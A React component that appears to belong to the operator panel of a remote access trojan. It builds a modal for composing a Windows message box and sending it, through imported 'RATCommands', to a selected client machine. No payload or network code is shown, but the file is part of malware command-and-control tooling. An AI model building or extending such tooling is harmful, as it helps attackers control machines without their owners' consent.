import { useState } from "react";
import { testMessageBoxCmd, sendMessageBoxCmd } from "../../../rat/RATCommands";

export const MessageBoxModal = ({
  selectedClient,
}: {
  selectedClient: string;
}) => {
  const [messageBoxTitle, setMessageBoxTitle] = useState<string>("");
  const [messageBoxContent, setMessageBoxContent] = useState<string>("");
  const [messageBoxButton, setMessageBoxButton] =
    useState<string>("abort_retry_ignore");
  const [messageBoxIcon, setMessageBoxIcon] = useState<string>("error");

  return (
    <dialog id="message_box_modal" className="modal">
      <div className="modal-box w-100 bg-primarybg text-white border border-accentx rounded-2xl">
        <h3 className="font-bold text-lg">Show MessageBox</h3>

        <div className="form-control mt-4">
          <label className="input input-bordered flex items-center gap-2 border-accentx bg-secondarybg rounded-3xl">
            <input
              type="text"
              placeholder="Title"
              className="grow"
              value={messageBoxTitle}
              onChange={(e) => setMessageBoxTitle(e.target.value)}
            />
          </label>
        </div>

        <div className="form-control mt-3">
          <label className="input input-bordered flex items-center gap-2 border-accentx bg-secondarybg rounded-3xl">
            <input
              type="text"
              placeholder="Content"
              className="grow"
              value={messageBoxContent}
              onChange={(e) => setMessageBoxContent(e.target.value)}
            />
          </label>
        </div>

        <div className="form-control mt-3">
          <select
            className="select select-bordered border-accentx bg-secondarybg rounded-3xl"
            value={messageBoxButton}
            onChange={(e) => setMessageBoxButton(e.target.value)}
          >
            <option value="abort_retry_ignore">AbortRetryIgnore</option>
            <option value="ok">OK</option>
            <option value="ok_cancel">OKCancel</option>
            <option value="retry_cnacel">RetryCancel</option>
            <option value="yes_no">YesNo</option>
            <option value="yes_no_cancel">YesNoCancel</option>
          </select>
        </div>

        <div className="form-control mt-3">
          <select
            className="select select-bordered border-accentx bg-secondarybg rounded-3xl"
            value={messageBoxIcon}
            onChange={(e) => setMessageBoxIcon(e.target.value)}
          >
            <option value="error">Error</option>
            <option value="question">Question</option>
            <option value="warning">Warning</option>
            <option value="info">Information</option>
            <option value="asterisk">Asterisk</option>
          </select>
        </div>

        <div className="flex flex-row gap-2 mt-4">
          <span
            onClick={() =>
              testMessageBoxCmd(
                messageBoxTitle,
                messageBoxContent,
                messageBoxButton,
                messageBoxIcon
              )
            }
            className="w-18 btn bg-secondarybg text-white border border-accentx rounded-3xl hover:bg-white hover:text-black transition"
          >
            Test
          </span>
          <span
            onClick={() =>
              sendMessageBoxCmd(
                String(selectedClient),
                messageBoxTitle,
                messageBoxContent,
                messageBoxButton,
                messageBoxIcon
              )
            }
            className="w-18 btn bg-secondarybg text-white border border-accentx rounded-3xl hover:bg-white hover:text-black transition"
          >
            Send
          </span>
        </div>
      </div>

      <form method="dialog" className="modal-backdrop">
        <button>close</button>
      </form>
    </dialog>
  );
};
